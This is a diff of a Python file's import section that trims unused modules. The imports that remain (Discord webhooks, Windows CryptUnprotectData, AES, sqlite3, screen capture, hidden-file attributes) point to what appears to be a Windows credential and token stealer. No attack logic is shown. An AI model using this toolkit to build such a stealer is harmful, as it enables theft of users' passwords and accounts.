@@ -1,19 +1,14 @@
 import base64
 import difflib
-from distutils.command.clean import clean
 import json
 import os
 import platform
 import re
 import shutil
-import socket
 import sqlite3
-import subprocess
-import sys
 import uuid
-import winreg
 from base64 import b64decode
-from json import dump, load, loads
+from json import loads
 from platform import platform
 from re import findall, match
 from shutil import copy2
@@ -21,18 +16,14 @@ from sqlite3 import connect
 from subprocess import PIPE, Popen
 from threading import Thread
 from time import localtime, strftime
-from urllib.request import urlopen
-from winreg import HKEY_LOCAL_MACHINE, OpenKey, QueryValueEx
 from zipfile import ZipFile
-from PIL import ImageGrab
+
 import psutil
 import requests
-import winshell
 import wmi
 from Crypto.Cipher import AES
-from cryptography.fernet import Fernet
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
-from pyautogui import screenshot
+from PIL import ImageGrab
 from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
